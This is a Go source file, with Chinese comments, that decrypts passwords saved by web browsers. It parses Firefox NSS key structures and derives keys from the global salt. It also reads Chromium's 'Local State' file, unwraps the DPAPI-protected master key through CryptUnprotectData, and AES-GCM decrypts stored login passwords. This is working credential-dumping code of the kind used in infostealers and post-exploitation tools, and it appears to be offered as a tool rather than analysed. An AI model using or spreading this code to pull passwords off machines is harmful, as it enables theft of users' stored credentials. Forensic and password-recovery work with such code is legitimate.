package crypher
import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/hmac"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/asn1"
	"encoding/base64"
	"errors"
	"fmt"
	"github.com/tidwall/gjson"
	"golang.org/x/crypto/pbkdf2"
	"io/ioutil"
	"syscall"
	"unsafe"
)

var (
	errDecodeASN1Failed   = errors.New("decode ASN1 data failed")
)
type NssPBE struct {
	NssSequenceA
	Encrypted []byte
}

type NssSequenceA struct {
	DecryptMethod asn1.ObjectIdentifier
	NssSequenceB
}

type NssSequenceB struct {
	EntrySalt []byte
	Len       int
}
type MetaPBE struct {
	MetaSequenceA
	Encrypted []byte
}

type MetaSequenceA struct {
	PKCS5PBES2 asn1.ObjectIdentifier
	MetaSequenceB
}
type MetaSequenceB struct {
	MetaSequenceC
	MetaSequenceD
}

type MetaSequenceC struct {
	PKCS5PBKDF2 asn1.ObjectIdentifier
	MetaSequenceE
}

type MetaSequenceD struct {
	AES256CBC asn1.ObjectIdentifier
	IV        []byte
}

type MetaSequenceE struct {
	EntrySalt      []byte
	IterationCount int
	KeySize        int
	MetaSequenceF
}

type MetaSequenceF struct {
	HMACWithSHA256 asn1.ObjectIdentifier
}
type LoginPBE struct {
	CipherText []byte
	LoginSequence
	Encrypted []byte
}

type LoginSequence struct {
	asn1.ObjectIdentifier
	IV []byte
}

type ASN1PBE interface {
	Decrypt(globalSalt, masterPwd []byte) (key []byte, err error)
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewASN1PBE(b []byte) (pbe ASN1PBE, err error) {
	var (
		n NssPBE
		m MetaPBE
		l LoginPBE
	)
	if _, err := asn1.Unmarshal(b, &n); err == nil {
		return n, nil
	}
	if _, err := asn1.Unmarshal(b, &m); err == nil {
		return m, nil
	}
	if _, err := asn1.Unmarshal(b, &l); err == nil {
		return l, nil
	}
	return nil, errDecodeASN1Failed
}


func (n NssPBE) Decrypt(globalSalt, masterPwd []byte) (key []byte, err error) {
	glmp := append(globalSalt, masterPwd...)
	hp := sha1.Sum(glmp)
	s := append(hp[:], n.EntrySalt...)
	chp := sha1.Sum(s)
	pes := PaddingZero(n.EntrySalt, 20)
	tk := hmac.New(sha1.New, chp[:])
	tk.Write(pes)
	pes = append(pes, n.EntrySalt...)
	k1 := hmac.New(sha1.New, chp[:])
	k1.Write(pes)
	tkPlus := append(tk.Sum(nil), n.EntrySalt...)
	k2 := hmac.New(sha1.New, chp[:])
	k2.Write(tkPlus)
	k := append(k1.Sum(nil), k2.Sum(nil)...)
	iv := k[len(k)-8:]
	return des3Decrypt(k[:24], iv, n.Encrypted)
}

func (m MetaPBE) Decrypt(globalSalt, masterPwd []byte) (key2 []byte, err error) {
	k := sha1.Sum(globalSalt)
	key := pbkdf2.Key(k[:], m.EntrySalt, m.IterationCount, m.KeySize, sha256.New)
	iv := append([]byte{4, 14}, m.IV...)
	return aes128CBCDecrypt(key, iv, m.Encrypted)
}

func aes128CBCDecrypt(key, iv, encryptPass []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	dst := make([]byte, len(encryptPass))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(dst, encryptPass)
	dst = PKCS5UnPadding(dst)
	return dst, nil
}

func PKCS5UnPadding(src []byte) []byte {
	length := len(src)
	unpad := int(src[length-1])
	return src[:(length - unpad)]
}

// des3Decrypt use for decrypt firefox PBE
func des3Decrypt(key, iv []byte, src []byte) ([]byte, error) {
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode := cipher.NewCBCDecrypter(block, iv)
	sq := make([]byte, len(src))
	blockMode.CryptBlocks(sq, src)
	return sq, nil
}

func PaddingZero(s []byte, l int) []byte {
	h := l - len(s)
	if h <= 0 {
		return s
	} else {
		for i := len(s); i < l; i++ {
			s = append(s, 0)
		}
		return s
	}
}
func (l LoginPBE) Decrypt(globalSalt, masterPwd []byte) (key []byte, err error) {
	return des3Decrypt(globalSalt, l.IV, l.Encrypted)
}

// 初始化一下DATA_BLOB结构体
func InitBlob(data []byte) *DATA_BLOB{
	if len(data) == 0{
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &data[0],
		cbData: uint32(len(data)),
	}
}
// 转字节数组
func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}
// 调用win32 api进行解密
func WinDecypt(data []byte) ([]byte, error){
	dllcrypt32 := syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 := syscall.NewLazyDLL("Kernel32.dll")
	procDecryptData := dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree := dllkernel32.NewProc("LocalFree")

	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(InitBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func AesGCMDeCrypt(crypted,key,nounce []byte)([]byte,error){
	// 解密aes
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode, _ := cipher.NewGCM(block)
	origData, err := blockMode.Open(nil, nounce, crypted, nil)
	if err != nil{
		return nil, err
	}
	return origData, nil
}

// 获取aes加密的key
func ReturnKeyFromLocalState(state string)([]byte,error){
	/*
		32字节DPAPI加密
		5字节b'DPAPI'头
		base64编码存储
	*/
	resp, err := ioutil.ReadFile(state)
	if err != nil {
		fmt.Println("Open Local State is failed ")
		return []byte{},err
	}
	masterKey ,err :=  base64.StdEncoding.DecodeString(gjson.Get(string(resp),"os_crypt.encrypted_key").String())
	if err != nil {
		return []byte{},err
	}
	// 移除DPAPI
	masterKey = masterKey[5:]
	// 利用win32api进行解密加密的key
	masterKey, err = WinDecypt(masterKey)
	if err != nil {
		return []byte{},err
	}
	return masterKey, nil
}

func DecryptPwd(pwd,masterKey []byte)([]byte,error){
	nounce := pwd[3:15]
	payload := pwd[15:]
	plain_pwd, err := AesGCMDeCrypt(payload,masterKey,nounce)
	if err != nil {
		return []byte{},nil
	}
	return plain_pwd,nil
}